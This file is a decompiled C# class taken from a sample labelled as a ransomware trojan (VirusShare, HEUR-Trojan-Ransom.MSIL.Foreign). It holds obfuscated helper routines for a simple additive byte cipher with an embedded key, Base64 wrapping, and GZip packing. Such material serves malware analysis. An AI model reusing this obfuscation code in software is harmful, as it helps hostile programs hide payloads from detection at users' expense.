// Decompiled with JetBrains decompiler
// Type: ր֬ᏉṢᡄẼ஗ᱻసҡƬོᒉࢲʗᎎཛྷ.҉ՄგᓍᪧᏈᭋᱣᆍᕫ๳᢫
// Assembly: update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E0159D6-932F-4F32-8DCB-751F61B22DA0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-1e13fd2b44573360e0d5f6cc2d3a4e1161d119837d808fac0c43885d53ec395f.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Text;

namespace ր֬ᏉṢᡄẼ\u0B97ᱻసҡƬོᒉࢲʗᎎཛྷ
{
  internal class \u0489ՄგᓍᪧᏈᭋᱣᆍᕫ\u0E73\u18AB
  {
    public static byte[] ᴅᏗᔇߍᝃ\u177Cᇋ߁ുɵḇ\u175Eଢ\u08BBᘰᔫೖ(byte[] _param0, bool _param1)
    {
      try
      {
        int num = new Random().Next(-2000000000, 2000000000);
        for (int index = 0; index < _param0.Length; ++index)
          _param0[index] = (_param0[index] += (byte) num);
        List<byte> byteList = new List<byte>();
        byteList.AddRange((IEnumerable<byte>) _param0);
        byte[] bytes = BitConverter.GetBytes(num);
        byteList.InsertRange(byteList.Count / 2, (IEnumerable<byte>) bytes);
        byte[] array = byteList.ToArray();
        byteList.Clear();
        return _param1 ? Encoding.ASCII.GetBytes(Convert.ToBase64String(array)) : array;
      }
      catch
      {
      }
      return (byte[]) null;
    }

    public static byte[] Ꮷ\u0DCCڪᘺౢᇺ\u1AFEơॊ(byte[] _param0, bool _param1)
    {
      try
      {
        List<byte> byteList1 = new List<byte>(_param1 ? (IEnumerable<byte>) Convert.FromBase64String(Encoding.ASCII.GetString(_param0)) : (IEnumerable<byte>) _param0);
        int int32 = BitConverter.ToInt32(byteList1.GetRange((byteList1.Count - 4) / 2, 4).ToArray(), 0);
        byteList1.RemoveRange((byteList1.Count - 4) / 2, 4);
        for (int index1 = 0; index1 < byteList1.Count; ++index1)
        {
          List<byte> byteList2;
          int index2;
          byteList1[index1] = (byteList2 = byteList1)[index2 = index1] = (byte) ((uint) byteList2[index2] - (uint) (byte) int32);
        }
        byte[] array = byteList1.ToArray();
        byteList1.Clear();
        return array;
      }
      catch
      {
      }
      return (byte[]) null;
    }

    public static string ᴩ\u104Bс᳦͒ࡘ(string _param0, bool _param1)
    {
      try
      {
        int num = new Random().Next(-2000000000, 2000000000);
        byte[] bytes1 = Encoding.GetEncoding(1252).GetBytes(_param0);
        for (int index = 0; index < bytes1.Length; ++index)
          bytes1[index] += (byte) num;
        List<byte> byteList = new List<byte>();
        byteList.AddRange((IEnumerable<byte>) bytes1);
        byte[] bytes2 = BitConverter.GetBytes(num);
        byteList.InsertRange(byteList.Count / 2, (IEnumerable<byte>) bytes2);
        byte[] array = byteList.ToArray();
        byteList.Clear();
        return _param1 ? Convert.ToBase64String(array) : Encoding.GetEncoding(1252).GetString(array);
      }
      catch
      {
      }
      return string.Empty;
    }

    public static string \u0895ᯋਨทϷԺҦ\u1CBCઊ၁ທ\u17ECᦃު\u1AF8ᒸᥲᦛᮓ(string _param0, bool _param1)
    {
      try
      {
        List<byte> byteList1 = new List<byte>(_param1 ? (IEnumerable<byte>) Convert.FromBase64String(_param0) : (IEnumerable<byte>) Encoding.GetEncoding(1252).GetBytes(_param0));
        int int32 = BitConverter.ToInt32(byteList1.GetRange((byteList1.Count - 4) / 2, 4).ToArray(), 0);
        byteList1.RemoveRange((byteList1.Count - 4) / 2, 4);
        for (int index1 = 0; index1 < byteList1.Count; ++index1)
        {
          List<byte> byteList2;
          int index2;
          byteList1[index1] = (byteList2 = byteList1)[index2 = index1] = (byte) ((uint) byteList2[index2] - (uint) (byte) int32);
        }
        byte[] array = byteList1.ToArray();
        byteList1.Clear();
        return Encoding.GetEncoding(1252).GetString(array);
      }
      catch
      {
      }
      return string.Empty;
    }

    public static byte[] ᴕƩbᘘՇᦒጲ്ͻෑ(byte[] _param0)
    {
      MemoryStream memoryStream = new MemoryStream();
      using (GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Compress, true))
        gzipStream.Write(_param0, 0, _param0.Length);
      memoryStream.Position = 0L;
      byte[] numArray = new byte[memoryStream.Length];
      memoryStream.Read(numArray, 0, numArray.Length);
      byte[] dst = new byte[numArray.Length + 4];
      Buffer.BlockCopy((Array) numArray, 0, (Array) dst, 4, numArray.Length);
      Buffer.BlockCopy((Array) BitConverter.GetBytes(_param0.Length), 0, (Array) dst, 0, 4);
      return dst;
    }

    public static byte[] \u0E34\u1801ีỉዧุƍᎢତҚ̳सᏥ\u0A80ᒺა(byte[] _param0)
    {
      using (MemoryStream memoryStream = new MemoryStream())
      {
        int int32 = BitConverter.ToInt32(_param0, 0);
        memoryStream.Write(_param0, 4, _param0.Length - 4);
        byte[] buffer = new byte[int32];
        memoryStream.Position = 0L;
        using (GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress))
          gzipStream.Read(buffer, 0, buffer.Length);
        return buffer;
      }
    }
  }
}
